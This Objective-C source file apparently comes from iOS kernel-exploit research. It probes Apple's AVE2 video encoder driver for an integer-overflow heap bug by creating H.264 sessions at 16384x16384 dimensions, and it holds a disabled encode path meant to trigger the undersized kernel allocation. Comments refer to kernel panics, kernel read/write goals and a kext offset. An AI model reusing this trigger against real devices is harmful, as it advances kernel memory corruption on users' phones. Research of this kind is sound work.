//
//  P107AveWrapDims.m — AVE2 wrap-dims encode oracle (note 233).
//  PANIC POSSIBLE: run fresh-boot, alone (one TAP per force-quit).
//

#import "P107AveWrapDims.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <CoreFoundation/CoreFoundation.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <VideoToolbox/VideoToolbox.h>
#import <fcntl.h>
#import <dlfcn.h>
#import <string.h>
#import <unistd.h>

#define P107_BUILD @"p107-ave-wrap-dims-v3"

static NSMutableString *g_log = nil;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); }
    }
}

static void p107_session(NSString *tag, int32_t w, int32_t h, BOOL doEncode) {
    VTCompressionSessionRef ses = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, w, h, kCMVideoCodecType_H264,
                                             NULL, NULL, NULL, NULL, NULL, &ses);
    if (st != noErr || !ses) {
        L([NSString stringWithFormat:@"[%@] %dx%d create status=%d (0x%x) ses=%p — REJECT (VT caps or driver gate)",
           tag, w, h, (int)st, (unsigned)st, ses]);
        return;
    }
    L([NSString stringWithFormat:@"[%@] %dx%d create status=%d ses=%p — ACCEPTED", tag, w, h, (int)st, ses]);
    if (doEncode) {
        L([NSString stringWithFormat:@"[%@] encode attempt (wrap candidate): expect undersized-alloc overflow class", tag]);
        /* generate the smallest legal pixel buffer for the wrapped dims and
           encode ONE frame; the driver's int32 wrap (w*h*10 > 2^31) makes its
           coded-data allocation undersized vs the actual output. */
        CVPixelBufferRef pb = NULL;
        CVReturn cv = CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                          kCVPixelFormatType_420YpCbCr8Planar, NULL, &pb);
        if (cv == kCVReturnSuccess && pb) {
            id out = ^(void *ref, OSStatus s2,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
                int64_t pts = sb ? CMSampleBufferGetPresentationTimeStamp(sb).value : -1;
                L([NSString stringWithFormat:@"    frame cb status=%d flags=0x%x pts=%lld",
                   (int)s2, (unsigned)flags, (long long)pts]);
            };
            OSStatus e = VTCompressionSessionEncodeFrame(ses, pb,
                                                        CMTimeMake(0, 600), CMTimeMake(1, 600),
                                                        NULL, (__bridge void *)out, NULL);
            L([NSString stringWithFormat:@"    encode status=%d (0x%x)", (int)e, (unsigned)e]);
            CVPixelBufferRelease(pb);
        } else {
            L([NSString stringWithFormat:@"    pixel-buffer create cv=%d (STOP encode)", (int)cv]);
        }
    }
    VTCompressionSessionInvalidate(ses);
    CFRelease(ses);
}

@implementation P107AveWrapDims

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    g_fd = open([[docs stringByAppendingPathComponent:@"p107_ave_wrap_dims_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    L([NSString stringWithFormat:@"=== p107 session %@ BUILD %@ (v2 NO-ENCODE) ===",
        LabLocalMilitaryNow(), P107_BUILD]);
    L(@"AVE2 wrap-dims create/prepare-ONLY oracle (note 233; the p035-v2 LAW: no EncodeFrame).");
    L(@"Redundancy note: p035 already swept this host-side ceiling (14 shapes). This tap v2 exists only");
    L(@"  to re-confirm on-demand; the kernel alloc cite = STATIC at kext +0xdc. hasKread=NO.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p107"];
    if (stop) { L(stop); if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); } return g_log; }
    L([LabDeviceProfile identBlock]);

    /* p035 v2 LAW (2026-10-21 wave): "Do not tap EncodeFrame next — Panic ≠
       KRW." P035 already swept THIS host-side ceiling (14 shapes incl. the
       wrap dims, all SessionCreate 0 + Prepare 0). So this tap v2 =
       create/prepare ONLY; the kernel alloc cite lives at kext +0xdc =
       the STATIC queue (note 234's #3 GOLDMINE-B twin). */
    /* v3 note: the 17's 2026-10-29 run printed the SAME ses pointer for
       both shapes = the allocator handed back the freed address (free +
       same-size malloc). NOT a stale/retained session — annotate rather
       than misread. */
    p107_session(@"control", 16384, 8192, NO);
    /* wrap candidate: 16384*16384*10 = 2.68e9 > 2^31 — int32 wrap */
    p107_session(@"wrap", 16384, 16384, NO);

    L(@"=== VERDICT: if the wrap session CREATE+ENCODE status = 0 while the driver's");
    L(@"  alloc wrapped small, that is the undersized-buffer class (IPS afterwards = the fix-side evidence).");
    L(@"  A clean 2c2-family rejection = the 26.5 fix is PRESENT in this AVE2 binary.");
    L(@"HONESTY: oracle only. hasKread=NO. One force-quit max (fresh boot next).");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
    return g_log;
}

@end